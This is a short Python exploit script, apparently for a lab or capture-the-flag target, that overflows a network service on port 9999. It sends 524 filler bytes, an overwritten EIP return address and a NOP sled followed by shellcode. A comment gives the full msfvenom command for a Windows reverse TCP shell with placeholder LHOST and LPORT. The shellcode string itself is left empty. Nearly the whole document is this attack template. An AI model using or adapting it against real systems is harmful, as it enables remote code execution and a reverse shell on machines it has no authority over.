#!/usr/bin/env python3

import socket, time, sys

ip = "RHOST IP"

port = 9999
timeout = 5

# Generate Shell Code
# msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
shell_code = ("")

filler = "A" * 524
eip = "\xf3\x12\x17\x31"  # "B" * 4
nops ="\x90" *10

string = filler + eip + nops + shell_code

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((ip, port))
    s.recv(1024)
    print("Fuzzing with {} bytes".format(len(string)))
    s.send(bytes(string, "latin-1"))
    s.recv(1024)
except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
